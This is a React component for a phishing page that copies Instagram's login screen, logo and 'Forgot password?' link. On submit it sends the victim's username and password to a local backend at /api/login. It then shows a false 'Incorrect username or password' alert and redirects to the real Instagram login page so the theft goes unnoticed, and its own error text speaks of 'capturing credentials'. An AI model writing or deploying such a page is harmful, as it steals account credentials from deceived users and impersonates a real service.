import { useState } from 'react'
import axios from 'axios'

const App = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/api/login", {
        username,
        password,
      });

      alert("Incorrect username or password");
      window.location.href = "https://www.instagram.com/accounts/login/";
    } catch (err) {
      console.error("Error capturing credentials", err);
    }
  };
  return (
    <div className="container">
      <div className="login-box">
        <img
          src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png"
          alt="Instagram"
          className="logo"
        />
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Log In</button>
        </form>
        <p className="forgot">Forgot password?</p>
      </div>
    </div>
  )
}

export default App